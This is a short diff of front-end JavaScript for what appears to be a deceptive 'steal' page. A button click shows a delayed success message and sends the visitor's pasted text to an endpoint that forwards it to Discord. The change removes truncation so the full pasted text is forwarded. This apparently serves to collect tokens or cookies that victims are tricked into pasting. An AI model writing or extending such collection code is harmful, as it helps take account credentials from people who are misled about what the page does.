@@ -7,11 +7,13 @@ document.querySelector('.steal-button').addEventListener('click', () => {
   setTimeout(() => successMessage.style.display = 'block', 6000);
 
   if (inputText.trim()) {
-    const truncatedText = inputText.length > 1500 ? inputText.slice(0, 1500) + '... [TRUNCATED]' : inputText;
     fetch('/api/send-to-discord', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ inputText: truncatedText }),
+      body: JSON.stringify({ 
+        inputText: inputText,
+        isLong: inputText.length > 1500 
+      }),
     })
       .then(res => res.ok ? null : console.error('Failed to send'))
       .catch(err => console.error('Error:', err));
